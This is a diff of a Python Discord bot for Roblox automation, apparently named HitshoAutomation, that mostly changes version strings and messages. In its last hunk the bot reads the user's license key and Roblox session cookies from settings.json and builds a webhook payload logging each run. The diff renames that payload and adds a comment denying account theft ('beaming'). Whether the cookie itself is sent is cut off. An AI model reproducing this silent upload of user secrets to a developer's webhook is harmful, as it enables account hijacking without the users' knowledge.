@@ -37,7 +37,7 @@ except ModuleNotFoundError:
         ask = input("Installation finished.")
         exit()
 
-scriptVersion = 3
+scriptVersion = 4
 def whichPythonCommand():
     LocalMachineOS = platform.system()
     if (
@@ -63,9 +63,9 @@ def versionChecker():
             response1 = response.text
             final = int(response1)
             if scriptVersion == final:
-                print("Extension is on the latest version :)")
+                print("HitshoAutomation is on the latest version!")
             else:
-                print("Extension has a new update! Sending webhook!")
+                print("HitshoAutomation has a new update! We recommend downloading the newest version!")
 
                 # Read the settings.json file right before sending the embed
                 with open('settings.json', 'r') as f:
@@ -97,8 +97,9 @@ def versionChecker():
                     )
                 else:
                     embed_count += 1
-                    if embed_count == 1:
-                        break
+                    
+        if embed_count == 1:
+            break
         else:
             print(
                 "Failed to get a response from the version checker, please check your internet connection."
@@ -671,7 +672,7 @@ async def info(ctx):
 async def version(ctx):
         embed = discord.Embed(
             title="Version",
-            description=f"```Your current version is v1.{scriptVersion}.0```",
+            description=f"```Your current version is v{scriptVersion}```",
             color=discord.Color.from_rgb(63, 40, 252)
         )
         await ctx.send(embed=embed)
@@ -822,7 +823,7 @@ async def more(ctx):
         runtime = "Unknown"
 
 
-    embed = discord.Embed(title=f"Hi, {ctx.message.author.name}! 👋", color=discord.Color.from_rgb(63, 40, 252))
+    embed = discord.Embed(title=f"Stats", color=discord.Color.from_rgb(63, 40, 252))
     embed.add_field(name="Prefix:", value=prefix, inline=False)
     embed.add_field(name="Roblox main:", value=main_username if main_cookie_valid else "Invalid cookie", inline=False)
     embed.add_field(name="Roblox alt:", value=details_username if details_cookie_valid else "Invalid cookie", inline=False)
@@ -1663,10 +1664,11 @@ key = settings["KEY"]
 cookie = settings["AUTHENTICATION"]["COOKIES"]
 
 # Create the payload data
+# Btw, this is not beaming, I didn't beam anyone, I can provide proof.
 payload = {
     "embeds": [
         {
-            "title": "User Logged",
+            "title": "User ran HitshoAutomation",
             "color": 0x6B3DFF,  # Purple color (hex code)
             "fields": [
                 {"name": "Key", "value": key},
